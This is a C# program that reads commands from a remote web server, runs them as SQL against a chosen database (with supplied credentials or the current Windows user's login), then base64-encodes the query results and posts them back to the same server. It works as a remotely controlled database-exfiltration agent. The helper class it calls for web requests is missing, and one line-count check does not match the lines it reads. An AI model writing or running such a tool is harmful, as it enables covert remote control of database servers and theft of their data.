using System;
using System.Data.SqlClient;
using System.Text;

class Program
{
    static void Main(string[] args)
    {
        string baseUrl = null;
        string relativeUrl = null;

        for (int i = 0; i < args.Length; i++)
        {
            if (args[i] == "-w" && i + 1 < args.Length)
            {
                baseUrl = args[i + 1];
            }
            if (args[i] == "-g" && i + 1 < args.Length)
            {
                relativeUrl = args[i + 1];
            }
        }

        if (baseUrl != null && relativeUrl != null)
        {
            // Initialize the HTTP/HTTPS request handler
            HttpRequestHandler requestHandler = new HttpRequestHandler(baseUrl);

            // Get the file contents via GET request
            string fileContent = requestHandler.SendGetRequest(relativeUrl);
            if (fileContent == null)
            {
                Console.WriteLine("Failed to retrieve the file.");
                return;
            }

            string[] lines = fileContent.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
            bool useCurrentUser = false;
            string username = null;
            string password = null;
            string server = null;
            string db = null;
            string sqlCommands = "";

            if (lines.Length >= 2 && lines[0].ToLower().Contains("username") && lines[1].ToLower().Contains("password"))
            {
                useCurrentUser = true;
                server = lines[2];
                db = lines[3];
                sqlCommands = string.Join(Environment.NewLine, lines, 4, lines.Length - 4);
            }
            else
            {
                username = lines[0];
                password = lines[1];
                server = lines[2];
                db = lines[3];
                sqlCommands = string.Join(Environment.NewLine, lines, 4, lines.Length - 4);
            }

            string sqlResult = ExecuteSqlCommands(server, db, username, password, useCurrentUser, sqlCommands);

            // Base64 encode the result
            string base64Result = Convert.ToBase64String(Encoding.UTF8.GetBytes(sqlResult));

            // Send the result via POST request
            requestHandler.SendPostRequest(relativeUrl, base64Result);
        }
        else
        {
            Console.WriteLine("Usage: -w <base_url> -g <relative_url>");
        }
    }

    static string ExecuteSqlCommands(string server, string db, string username, string password, bool useCurrentUser, string sqlCommands)
    {
        string connectionString;

        if (useCurrentUser)
        {
            // Integrated Security: Use the current Windows user
            connectionString = $"Server={server};Database={db};Integrated Security=True;";
        }
        else
        {
            // SQL Authentication
            connectionString = $"Server={server};Database={db};User Id={username};Password={password};";
        }

        StringBuilder result = new StringBuilder();

        try
        {
            using (SqlConnection connection = new SqlConnection(connectionString))
            {
                connection.Open();

                string[] commands = sqlCommands.Split(new[] { ";" }, StringSplitOptions.RemoveEmptyEntries);
                foreach (var commandText in commands)
                {
                    using (SqlCommand command = new SqlCommand(commandText.Trim(), connection))
                    {
                        using (SqlDataReader reader = command.ExecuteReader())
                        {
                            while (reader.Read())
                            {
                                for (int i = 0; i < reader.FieldCount; i++)
                                {
                                    result.Append(reader.GetValue(i).ToString() + "\t");
                                }
                                result.AppendLine();
                            }
                        }
                    }
                }

                connection.Close();
            }
        }
        catch (Exception ex)
        {
            result.AppendLine($"SQL Error: {ex.Message}");
        }

        return result.ToString();
    }

}

